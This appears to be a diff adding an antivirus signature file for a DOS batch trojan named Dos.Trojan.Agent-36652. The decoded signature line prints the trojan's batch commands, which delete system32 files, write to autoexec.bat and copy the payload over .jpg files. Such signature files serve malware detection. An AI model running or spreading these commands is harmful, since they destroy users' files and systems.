@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36652
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off if exist c:\windows\system32*.* del y | c:\windows\system32\*.* >> autoexec.bat copy 0% c:\windows\msdos726.ini.bat if exist c:\*.jpg copy 0% c:\*.jpg :loop set retard=loop if !%h%==!true pause %h%>nul >> autoexec.bat goto %retard% 
